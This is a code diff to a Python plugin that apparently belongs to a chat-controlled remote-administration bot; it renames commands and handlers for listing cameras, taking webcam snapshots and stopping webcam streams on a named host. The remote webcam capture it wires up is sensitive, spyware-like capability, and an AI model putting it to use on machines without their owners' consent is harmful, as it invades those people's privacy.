@@ -28,10 +28,10 @@ class Main(Plugin):
         c = Command('/cam_stream_stop', usage='HOSTNAME /cam_stream_stop - stop webcam streaming')
         self.add_command(c)
 
-        c = Command('/cameras', usage='HOSTNAME /cameras - list cameras by ID number')
+        c = Command('/cam_list', usage='HOSTNAME /cam_list - list cameras by ID number')
         self.add_command(c)
 
-        c = Command('/snapshot', usage='HOSTNAME /snapshot <id> - take a picture from the camera #<id>')
+        c = Command('/cam_snapshot', usage='HOSTNAME /cam_snapshot <id> - take a picture from the camera #<id>')
         self.add_command(c)
 
     def handle(self, command, chat_id, *args, **kwargs):
@@ -49,20 +49,20 @@ class Main(Plugin):
             t = Thread(target=self.handle_cam_stream_stop)
             t.start()
 
-        if command == '/cameras':
+        if command == '/cam_list':
             arg_list = [chat_id]
             arg_list += args
 
-            t = Thread(target=self.handle_cameras, args=tuple(arg_list))
+            t = Thread(target=self.handle_cam_list, args=tuple(arg_list))
             t.start()
-        if command == '/snapshot':
+        if command == '/cam_snapshot':
             arg_list = [chat_id]
             arg_list += args
 
-            t = Thread(target=self.handle_snapshot, args=tuple(arg_list))
+            t = Thread(target=self.handle_cam_snapshot, args=tuple(arg_list))
             t.start()
 
-    def handle_cameras(self, chat_id):
+    def handle_cam_list(self, chat_id):
         if self.bot.platform == 'win32':
             try:
                 cam = []
@@ -84,7 +84,7 @@ class Main(Plugin):
                 return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
 
 
-    def handle_snapshot(self, chat_id, cam_id):
+    def handle_cam_snapshot(self, chat_id, cam_id):
         self.bot.send_message(chat_id, 'Taking a picture!')
 
         if self.bot.platform == 'win32':
